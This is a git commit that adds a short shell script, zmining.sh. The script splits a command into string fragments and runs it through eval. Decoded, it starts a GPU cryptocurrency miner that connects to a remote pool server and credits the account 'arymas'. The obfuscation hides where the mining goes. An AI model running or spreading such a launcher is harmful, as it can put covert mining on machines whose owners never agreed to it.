69eff3276a9188e61bf84f6b055eeb208b9f1765
arymas49 <58667903+arymas49@users.noreply.github.com>
2023-11-22 04:42:15 +0800

    Add files via upload

---
+++ zmining.sh
@@ -0,0 +1,3 @@
+z="
+";Tz='s 0 ';Zz='plim';Bz='ner ';Gz='4.92';Cz='--se';Sz='vice';Kz=' --u';Wz='ity ';Pz=' x -';Fz='33.1';Uz='--in';Az='./mi';az='it 1';Yz='-tem';Nz='a --';Hz=' --p';Rz='a_de';Ez=' 45.';bz='50';Vz='tens';Qz='-cud';Xz='64 -';Lz='ser ';Jz='1236';Iz='ort ';Oz='pass';Dz='rver';Mz='arym';
+eval "$Az$Bz$Cz$Dz$Ez$Fz$Gz$Hz$Iz$Jz$Kz$Lz$Mz$Nz$Oz$Pz$Qz$Rz$Sz$Tz$Uz$Vz$Wz$Xz$Yz$Zz$az$bz"
